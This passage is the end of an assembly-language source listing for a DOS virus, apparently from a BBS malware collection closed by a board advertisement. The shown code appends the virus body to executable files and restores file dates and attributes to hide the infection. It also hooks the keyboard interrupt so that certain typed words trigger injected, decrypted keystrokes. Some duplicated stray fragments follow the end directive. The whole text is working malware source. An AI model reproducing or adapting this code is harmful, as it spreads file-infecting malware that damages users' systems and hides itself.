	JNE	BP0510			; Branch if not
	MOV	DX,F_SIZ1		; Low-order file size
	MOV	CX,F_SIZ2		; High-order file size
	MOV	AX,4200H		; Move file pointer
	INT	21H			; DOS service (Move pointer)
BP0500:	JB	BP0510			; Follow chain of error branches
	XOR	DX,DX			; Address beginning of virus
	MOV	CX,OFFSET ENDADR	; Length of virus
	MOV	AH,40H			; Write handle
	INT	21H			; DOS service (Write handle)
	ASSUME	DS:NOTHING
BP0510:	CMP	MEM_SW,0		; Test memory allocated switch
	JE	BP0520			; Branch if off
	MOV	AH,49H			; Free allocated memory
	INT	21H			; DOS service (Free memory)
BP0520:	CMP	F_HAND,-1		; Test file handle
	JE	BP0530			; Terminate if none
	MOV	BX,F_HAND		; Get file handle
	MOV	DX,F_DATE		; Get file date
	MOV	CX,F_TIME		; Get file time
	MOV	AX,5701H		; Set file date and time
	INT	21H			; DOS service (Set file date)
	MOV	AH,3EH			; Close handle
	INT	21H			; DOS service (Close handle)
	LDS	DX,F_PATH		; Address program pathname
	MOV	CX,F_ATTS		; Load file attributes
	MOV	AX,4301H		; Set file attributes
	INT	21H			; DOS service (Set attributes)
	LDS	DX,INT_24		; Original interrupt 24H address
	MOV	AX,2524H		; Set interrupt 24H
	INT	21H			; DOS service (Set int)
BP0530:	POP	ES
	POP	DS
	POP	DI
	POP	SI
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	POPF
	JMP	INT_21			; Interrupt 21H

	; Interrupt 16H routine

BP0540:	PUSHF				; Fake an interrupt
	CMP	AH,0			; Get a token function?
	JE	BP0550			; Branch if yes
	POPF				; Fake interrupt not needed
	JMP	INT_16			; Pass on to original interrupt

BP0550:	CALL	INT_16			; Deal with original interrupt
	PUSH	AX
	PUSH	BX
	PUSH	DI
	PUSH	DS
	PUSH	ES
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	XOR	BX,BX			; \ Set ES to zero
	MOV	ES,BX			; /
	ASSUME	DS:CODE,ES:RAM
	CMP	OUT_SW,0		; Is output switch on?
	JNE	BP0630			; Branch if yes
	OR	AL,20H			; Convert to lower case
	XOR	AL,0AFH			; Decrypt character
	MOV	DI,OFFSET TABLE		; Address first entry
BP0560:	CMP	BYTE PTR [DI],0		; Is this the end of the table?
	JE	BP0590			; Branch if yes
	XOR	BX,BX			; Clear register
	MOV	BL,[DI+1]		; Get current character pointer
	ADD	BX,[DI+2]		; Add current entry pointer
	CMP	AL,[BX]			; Is character the one we want?
	JE	BP0570			; Branch if yes
	MOV	BYTE PTR [DI+1],0	; Clear character pointer
	JMP	BP0580

BP0570:	INC	BYTE PTR [DI+1]
BP0580:	ADD	DI,4			; Next entry
	JMP	BP0560			; Process next entry

BP0590:	MOV	DI,OFFSET TABLE		; Address first entry
BP0600:	CMP	BYTE PTR [DI],0		; Is this the end of the table?
	JE	BP0610			; Branch if yes
	MOV	AL,[DI+1]		; Get current character pointer
	CMP	AL,[DI]			; Do we have a complete match?
	JNE	BP0620			; Branch if not
	MOV	TABOUT,DI		; Save relevant pointer
	INC	OUT_SW			; Set on output switch
	MOV	AX,40H			; \ Address RAM
	MOV	ES,AX			; /
	ASSUME	ES:RAM40
	MOV	AX,BW041A		; Get key token in pointer
	MOV	BW041C,AX		; Set key token out pointer
	CALL	BP0640			; Put a character into the buffer
BP0610:	POP	ES
	POP	DS
	POP	DI
	POP	BX
	POP	AX
	IRET

BP0620:	ADD	DI,4			; Next entry
	JMP	BP0600			; Process next entry

BP0630:	MOV	AX,40H			; \ Address RAM
	MOV	ES,AX			; /
	CALL	BP0640			; Put a character into the buffer
	XOR	BX,BX			; Clear register
	MOV	BL,[DI+1]		; Get current character pointer
	ADD	BX,[DI+2]		; Add entry pointer
	CMP	BYTE PTR [BX],0		; Was that the last character?
	JNE	BP0610			; Branch if not
	MOV	OUT_SW,0		; Set off output switch
	JMP	BP0610

BP0640:	MOV	DI,TABOUT		; Address relevant table entry
	XOR	BX,BX			; Clear register
	MOV	BL,[DI+1]		; Get current character pointer
	ADD	BX,[DI+2]		; Add entry pointer
	MOV	AL,[BX]			; Get the character
	XOR	AL,0AFH			; Decrypt character
	INC	BYTE PTR [DI+1]		; Next character
	MOV	AH,AL			; Copy for translate
	MOV	BX,OFFSET KEYTAB	; Address key number table
	XLAT				; Get key number
	XCHG	AH,AL			; Reserve order
	MOV	BX,BW041C		; Get key token out pointer
	MOV	ES:[BX],AX		; Put key token into buffer
	INC	BX			; \ Next buffer position
	INC	BX			; /
	CMP	BX,BW0482		; Passed end of buffer?
	JNE	BP0650			; Branch if not
	MOV	BX,BW0480		; Get buffer start
BP0650:	MOV	BW041C,BX		; Save new key token out pointer
	RET

	; Stack area - This is also necessary to make the virus a complete
	; number of paragraphs

	DB	04CH, 002H, 0AAH, 031H, 09EH, 002H, 0A5H, 031H

ENDADR	EQU	$

CODE	ENDS

	END	START
ete
	; number of paragraphs

	DB	04CH,
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

